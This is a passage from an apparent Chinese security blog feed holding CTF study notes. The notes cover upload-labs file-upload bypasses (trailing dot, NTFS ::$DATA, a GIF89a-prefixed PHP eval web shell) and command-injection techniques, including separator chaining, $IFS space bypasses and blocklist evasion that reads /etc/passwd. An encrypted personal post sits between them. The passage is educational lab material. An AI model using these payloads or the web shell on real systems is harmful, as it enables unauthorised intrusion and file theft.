class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有发现去掉首尾空格的函数，于是我觉得阔以通过空格后缀绕过，事实也果然，burp抓包，在结尾加空格即可<br>….提示上传出错….我服了，这他妈是什么情况??? 查看源码，也找8到问题所在，wdnmd</p><h1 id="page-08-后缀名加点绕过"><a href="#page-08-后缀名加点绕过" class="headerlink" title="page-08 后缀名加点绕过"></a>page-08 后缀名加点绕过</h1><p>源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);   <span class="hljs-comment">//取后缀</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>进行了首尾去空以及转换大小写操作，同时把$DATA也去除了</p><p>但是没有使用delot()去除文件名末尾的点，于是可以抓包，然后在文件后缀结尾处加’.’绕过，上传成功后，win会自动把后缀名中的点去掉</p><h1 id="page-09-DATA绕过"><a href="#page-09-DATA绕过" class="headerlink" title="page-09 ::$DATA绕过"></a>page-09 ::$DATA绕过</h1><p>原理:<br>源代码缺少 $file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);&#x2F;&#x2F;去除字符串::$DATA限制，可以文件名后缀增加::$DATA绕过</p><p>Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容(么看懂)</p><p>NTFS文件流实际应用<br>NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$DATA<br>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</p><p>解题步骤<br>上传文件名info8.php::$DATA，访问时去除后缀<br>(.phtml文件是指嵌入了php代码的html文件)</p><p>绕过WAF通常用8同形式的编码</p><h1 id="文件幻术头绕过"><a href="#文件幻术头绕过" class="headerlink" title="文件幻术头绕过"></a>文件幻术头绕过</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">GIF89</span>a? <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_REQUEST[<span class="hljs-number">1</span>])</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>  <span class="hljs-comment">//文件幻术头绕过...</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>战斗记忆</title>
    <link href="/2022/03/26/%E6%88%98%E6%96%97%E8%AE%B0%E5%BF%86/"/>
    <url>/2022/03/26/%E6%88%98%E6%96%97%E8%AE%B0%E5%BF%86/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fc63285e543951ae0a15b64d6485f8eda42135b3a273da3743a6cb9c930faff7">e4bd6587f5b022b7ffbfbb7e009dbc1673e44afafaac8e35539580f7c0d16876c8e0ea10f0a28ab382bacc6420450ee20634dcba2202b1d9a745ec6febb78fab82f5b8251154167c006eb7e914edd429fa4c99b83a33db3c6c6eb24a0a661d4a758f6e1c360d45cb083d66f7bc538fa58891f88975e17107a340bdb1af8aba42b32d22e882e71ba12ef71c71dda5f0e72aff9659e94ccb0e5a5ee8e3a6adacfd8b7d42d3080f592273afc4975a6687e17c9bec7b7c3abbcf69f1b3344e5455596d774eb8bae522c96a75c7841efa170a26b0d94f22c58da4b5398dad49986defa08cc74600ef41afb6adb779bdf7e1772cc28bcc74a7914373429827598d378951ac2bba3c59f92ce7587b3efa2ac2b53bbc350d78582cc9c0390c18f5caff3754e52d7a72f543f5f37f7de24211329e705725f226c1915df6aab4920778548e35ca307f5cb3a6bcb1f50b2cdeb1cece24e30dfa418fe5cb79ada6c80f46539f4c4b1d5a87d996690f9020704a1eb2ff6ba55652158cae48b82a8e81244abd6008894762c6c4418406f00dff242035868d871dc36b6e3f8f66d3a9b5009a5092b1e4fa64a5df30a4cde0f9fcf72df2e7eb7b03d0b3226d7e768204e207beb1f31c95c878a806482ed55a713a925a86ba9d9794fbe17946c00e1b1b6640e039c6d31672dfdf9f83ecad3bf75a95ac32a2781e579e131b4a29b7dd71551ed5d1176ab7ff0c7c7e955add1abe87eb04284713ee403e0b9a08039ca94fb3bac00bc5747e590589e4833a283361c1553bdca65b82caa99921ead5e395110c452db8de7f4d1daed33d912bbcd147b3b3442379c8bfba716a12cc7db90373a715120e13d965aa5fb9a354dbe921711d906b944a7177c7e1837e66c3d07d417fb2706d6a2eceec7b81067c2893ead2501c270c8c8f37b9abf3a3324d5e83377d87e04cc3311b09895b03fede1d113f8141f792db4619d52b3335a6ddf870808a58100fb646033f5886ea3053205328b4d09ded3e95d3c3260a2dc0e58dba3a83885535b5c07c2ec9c935b3185dda764604a7676e6d6332add8099c2c196e14799126e6d34afbbe6218e2795c58b243d89362bde30befb6294862f1888ff4266515bbda37af37830ff172e70e82f0010e895cae385365fe63f8d941cc7349daa5467e69edf99eb205ca1910bcde96bdd389a17c54a3ff51036fb69c519da4acd3f733670f1ab326158b82f676ea7b85e5bb173d82440e6710f9ed11092da9f61457f1f4e0816a2fbee830ccc378479d182400c31a94955f7de3998776343bf02e58680ecb97cfe694edf8fd2ba8241d2d5937725f77136f6a69d5f269c86a962babd0c81781f32560409293f4421082d354c3b4772accc0d1d7039b4423f3be66f270c90002e26c2c54cd420b1eb35e18033b6d6291a6b08221174b736e1975ca196d57a2e4e78999ae9e3762fff8831ec41fd198b97fca2213735721101dd52f3e0c8ee4bf59c2cde649ca5350f4637d8404570521e083a1795f8f85af42b7d5aca53b2553376c9a02cd6148c24aa684b928969f3b6c9b4fe5af921f39b85180e62a4e0ab81606bf5d01e9d31de89b9e39223fbe22a849cb65f4de6dae9ab7ff80d92c3cc545d0cf420dbcbc37caef327579d4a00bbf0a5aab3fa45d4be8d1ab62f300d29929bec0ec16fcff73ef84f76ea1898310a64efe9041df2f4aeed7dfd61164f97c438de578d78049dc29dd81fd26a5abac55c476c6364c779bb08290dbff0ff63c387bd71db73340aceff129c965c9de1391b7b1203f7aa5a4d21dd3e319a85bdf273aa94773dc10a03eca106a8a2d3bcadef19bdbf2ae36e0c5084a6633c1caf7e33f43fec9b1f7f228109aea0ec8438fa8ae92fcda76dba28c935e7f5ff3eb27a1adeadba50265f1572f0a7166d31bd4cb5daad2aec4374f3505976b93cfbb683e80f2d2d52ea30753d309568461215df0caa6f62ada5e524d8eb1fc2e0fb764ccd5a347de1d88f1bbfaf4edb09107e2e284b48dbab1aa666f8a88765870cfcc8f0c65b94dbca61be675f167eb47494cf08ae5794b38de7625e053d998756e45ec07b67231ca6526ba3f2953d6ee4df88cc354bce20f0e7ad3df5f808d20e1927ff5e0fa2b15f1292c2ccc476f4aef588bf420fac5cdbb3c743a5f5a5a836074d1f4503c2ad9750128f769f43553cd2afd5d9791ee52417e5ed2e513f189394965a2f3090903cafbc4983a82988d3b674ba74e031fb3600349d7c32a25bb0cd267e8e650d3ca1c5eba7dea73afeb9a34a492da51e1bf4554e158cb585d0c8f3b356e194e9249ca8f50a278b7e6ab9f02f2ac5fb96b5066599c964e5666ac6c1bc294d90087b2bf35c6aad218a8ed1b3d617ff184593666794c9bc3d27503913dbf9fc7f7d30d32dba043309d1317a3f47f83d38260b29c0b50b0534c569d6ded8e1eebd7b93c2a7e2429901b9963f837bd7e032201ba734c7a787cc07c96b438b9035b0fbb14795cdb45c312dbd9b8c74d85149520f11fcf56aa248978b8834d0d3b6a2bf456c23550a5cc0bd5a27f9946d125216b6ab37323c4320c0ccbcae8c3dbb6134e4c096521c5d7b0e5b945251a17c011e8b76cfd55c30c1dfa34e90c2e49bbc1a93b9155e1b7aedf84a37118c9885ed9ad612423cf6ede6634d757fd6659f68dffba9bd81f24a3bf618bf77e8bbfcdd1dbc8342274e76e4a5758e4a66007e99bc16700023d31f956eb16419501d502d199dfdc673cde925a21f1b74abe8e5abd1c46aa79bd26da0bb3e5ccb696a0c9bb816c9ca4bb8e3d05aa7e8b0fa9a0c219ac33278ecbcf831f78d6ada634b077bf5e45eb0103768ae7c1aee1b244d7086d816bbc6586d08bf92480af5188ac5248a0de9624602df5d31cf5898d7c0cf7aebaf1ea6f4b12caf15881c04ac3dbfb3f6309c77324ae1e78aa03da51896156e4d2a0562b7cb74a8b4d39761c7351df275a0ac5c4fc91824fe9c781252c378e17db184cc98cdf89c48f2772bfab7afdf4ccab5113e1fcf37fea6c90b5773040c58fd32faeb62dc6b92ac0721bfc8402214192f54ab6a6800e57e1bd3f1985a5b5cb4955eb29a8903ba13a29ed5aa158d0edc9693c76637c3d56b6e47e39760e6eaf966b7e4432815d5c0d4d34d424647714edd6226bf3d06508390d12a1e9f66327862acf01e1b246ca29eecc5c72ba2fa30ab12c433d0e9ca8e777322657cef6470ca633a29f2756873a1b88e70eb9e571f0cc8ad560110224daaf0c42a2676ae74b42cd2aa665d472dcfc0345bd7dd0adb7288c56128a772149b06bcc2e517fe0667811503b7e7d0b5700322959105b7931e1dc62713d71b534d935be277409cc6516d4f917ffab12f9f328dad8df31f6bee2eaba6486a888ecb3514383b11fe06ead05be3a86a45bbbe3bfa057e3e0081fa1ea19925e54729d2c1f040a2f1806fa3442e9af8a4246a16e8c7a8e4813c3a3bba3f7971b15096df1743e7c7897e0f8b80755117c4a74933631f640af5c016833e3a0d06feb0c952addef6f84ce9e9a0026e8acad62895cc61141361f404e1261b02e600a9e17bed920cf26762e7cc8a7e9b7c219f10018a2219aa72f3f06982205024dac859386bb98c57c928363b8624a181b7ce09d14bd3b5af423349e58b519c28246f4c8bc6dc34eedf367c9a87475ea0380edeca8cd937e76e0f55d694d8a4e27fd6645d5165ad03608db62ef8669a53fc409b48eb5b1ebb15b8bd3d99c6f02440bd770551b3c0ac2ad56627f369c2d4521d6db0166153f82b7e1f0b4e139ef32837ce1f7cf5ff1ed053b2bca7bd34bc050d80ebbcc6affec672d93183d7a2a321508ac21d59813b9caf12f14c0d4d067e9a86a41af52b37e025dca6225d6df709b94ba0e9353dc6bde90a2174469bab74cfb274f76bd914cc92929d028044384e95ed48b160ea9c56efb6d346314d7c086b9b083e93f70e183926d9418c976ddce42b3c59433f1cb7392e1a865c13c9f5df5ffe53fe439748f19443f191465bd7edd3c96ba5fa17dd1154358538c72d32edfd4348fff9b3a8b58253e84eeee4eaa0db30f4d5e0f328baa89083b8ee190308edb7787cff809c29dea63c0b91b9cf0089ec6a75d7bc751175d4a21429df6efcc3ff32a512eb409820f377d4fc9aaba55fbddd29be11a40c0a7af1cc6400d7c205a1be9eaec1c50c0c9287ffac650cac3aa990d786de336c5010eb96e52e287c07f300f178c28aadd6ec421b26b5df85ae0ab3a1863082e43ec619384750e4e1253a60ab0a2f0a7af3c16d498cd7c1390b6abc6bcf5325a65cf99b74ba63255905fd753196fa725448b348cf7eb1f4d268b968b844c76c90118cb7ac55033dd0d039229592b8b66c74ec7d6d00e4e9e21fb3d455321e8fbcf54d86899da6cdd107d72756f01ce962dd0bd24244c710561cdcb1f22151ed84ed6063ec4a9d9952db8a167</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">为菈妮，我变成狼人模样</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>大道三千</category>
      
    </categories>
    
    
    <tags>
      
      <tag>大道三千</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="/2022/03/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/03/24/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞，通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名&#x2F;IP&#x2F;掩码&#x2F;网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、发送邮件、转换图片等功能都可能出现该类漏洞。</p><!-- about --><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>在win或linux下，<br>||: [command1]||[command2]表示先执行command1, 若command1为假，则执行command2;<br>&amp;&amp;: 先执行command1, 若为真，则执行command2<br>|: 表示只执行command2(在必须输入command1且只想返回command2(比如回显行数被限定)的时候有用)<br>&amp;: 先执行command1再执行command2<br>;: 前面的执行完执行后面的<br>ls &#x2F;(注意空格): 列出根目录下的所有文件<br>pwd: (print work directory), 用于立刻显示当前所在目录</p><h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><p>PHP:<br>system<br>exec<br>passthru<br>shell_exec<br>popen<br>proc_open</p><p>Python:<br>system<br>popen<br>subprocess.call<br>spawn</p><p>Java:<br>java.lang.Runtime.getRuntime().exec(command)</p><h1 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h1><p>就是利用|、||、&amp;、&amp;&amp;</p><h1 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h1><p>就是将反引号内的输出当作输入执行<br>作业:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?ip=127.0.0.1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$9</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="命令执行绕过空格"><a href="#命令执行绕过空格" class="headerlink" title="命令执行绕过空格"></a>命令执行绕过空格</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span>&#123;IFS&#125;<span class="hljs-variable">$9</span><br>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><br><span class="hljs-variable">$</span>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span> //<span class="hljs-variable">$1</span>改成<span class="hljs-variable">$</span>加其他数字貌似都行<br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;<span class="hljs-built_in">cat</span>,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来<br>%<span class="hljs-number">20</span>   (space)<br>%<span class="hljs-number">09</span>   (tab)<br>X=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="hljs-variable">$X</span>       （\x09表示tab，也可以用\x20）<br></code></pre></td></tr></table></figure><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">a=l;b=s;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><br>echo <span class="hljs-string">&quot;bHM=&quot;</span> | base64 -d  <span class="hljs-regexp">//</span>base64绕过<span class="hljs-string">&#x27;ls&#x27;</span>---&gt;思路扩展，可否换成其他编码呢? <br><span class="hljs-regexp">/?in/</span>?s =&gt; <span class="hljs-regexp">/bin/</span>ls<br>cat <span class="hljs-regexp">/etc/</span>pass<span class="hljs-string">&#x27;w&#x27;</span>d       <span class="hljs-regexp">//</span>连接符绕过<br>cat<span class="hljs-variable">$x</span> <span class="hljs-regexp">/etc/</span>passwd       <span class="hljs-regexp">//</span>未定义的初始化变量绕过<br></code></pre></td></tr></table></figure><h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 